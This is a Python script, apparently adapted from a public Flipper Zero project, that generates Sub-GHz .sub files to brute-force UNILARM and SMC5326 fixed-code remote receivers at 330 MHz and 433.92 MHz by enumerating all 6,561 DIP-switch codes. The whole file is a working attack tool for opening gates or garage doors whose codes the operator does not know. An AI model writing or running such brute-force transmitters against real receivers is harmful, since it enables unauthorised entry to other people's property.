from os import system

# Refer from https://github.com/tobiabocchi/flipperzero-bruteforce
def key_bin_str_to_sub(bin_str):
	sub = ""
	line_len = 0  # keep lines under 2500 chars
	for bit in bin_str:
		if line_len > 2500:
			sub += "\nRAW_Data: "
			line_len = 0
		sub += transposition_table[bit]
		line_len += len(transposition_table[bit])
	sub += stop_bit
	return sub

file_header = (
	"Filetype: Flipper SubGhz RAW File\n"
	+ "Version: 1\n"
	+ "Frequency: %s\n"
	+ "Preset: FuriHalSubGhzPresetOok650Async\n"
	+ "Protocol: RAW\n"
)

transposition_table = {
	'0':'150 -650 ',
	'1':'550 -250 '
}

stop_bit = "150 -5600 "


# Generate .sub files for Brute force UNILARM
sub_file = []
lut = [0b00, 0b10, 0b11]
gate1 = 3 << 7
gate2 = 3 << 5
for dip in range(3**8):
	total = 0
	for j in range(8):
		total |= lut[dip % 3] << (2 * j)
		dip //= 3
	total <<= 9
	total |= gate1
	# Play the signal 3 times
	sub_file.append("RAW_Data: " + key_bin_str_to_sub(bin(total)[2:])*3)


system("mkdir -p UNILARM_330/6561 UNILARM_433/6561")
system("mkdir -p UNILARM_330/2187 UNILARM_433/2187")
system("mkdir -p UNILARM_330/729 UNILARM_433/729")
system("mkdir -p UNILARM_330/243 UNILARM_433/243")
system("mkdir -p UNILARM_330/81 UNILARM_433/81")
system("mkdir -p UNILARM_330/27 UNILARM_433/27")
system("mkdir -p UNILARM_330/9 UNILARM_433/9")
# system("mkdir -p UNILARM_330/3 UNILARM_433/3")

# Change limit to smaller number if u want generate lesser file
limit = 7
for frequency in ["330000000","433920000"]:
	i = 1
	while i != 3**limit:
		n = 3**8 // i
		for j in range(i):
			open(f"UNILARM_{frequency[:3]}/{n}/{j}.sub",'w').write(file_header%(frequency)+'\n'.join(sub_file[j*n:(j*n)+n]))
		i*=3

# Generate .sub files for Brute force SMC5326

transposition_table = {
	'0':'300 -900 ',
	'1':'900 -300 '
}

stop_bit = "900 -7500 "

sub_file = []
lut = [0b00, 0b10, 0b11]
gate1 = 0b111010101
gate2 = 0b101110101


for dip in range(3**8):
	total = 0
	for j in range(8):
		total |= lut[dip % 3] << (2 * j)
		dip //= 3
	total <<= 9
	total |= gate1
	# Play the signal 5 times
	sub_file.append("RAW_Data: " + key_bin_str_to_sub(bin(total)[2:])*5)

system("mkdir -p SMC5326_330/6561 SMC5326_433/6561")
system("mkdir -p SMC5326_330/2187 SMC5326_433/2187")
system("mkdir -p SMC5326_330/729 SMC5326_433/729")
system("mkdir -p SMC5326_330/243 SMC5326_433/243")
system("mkdir -p SMC5326_330/81 SMC5326_433/81")
system("mkdir -p SMC5326_330/27 SMC5326_433/27")
system("mkdir -p SMC5326_330/9 SMC5326_433/9")

# Change limit to smaller number if u want generate lesser file
limit = 7
for frequency in ["330000000","433920000"]:
	i = 1
	while i != 3**limit:
		n = 3**8 // i
		for j in range(i):
			open(f"SMC5326_{frequency[:3]}/{n}/{j}.sub",'w').write(file_header%(frequency)+'\n'.join(sub_file[j*n:(j*n)+n]))
		i*=3
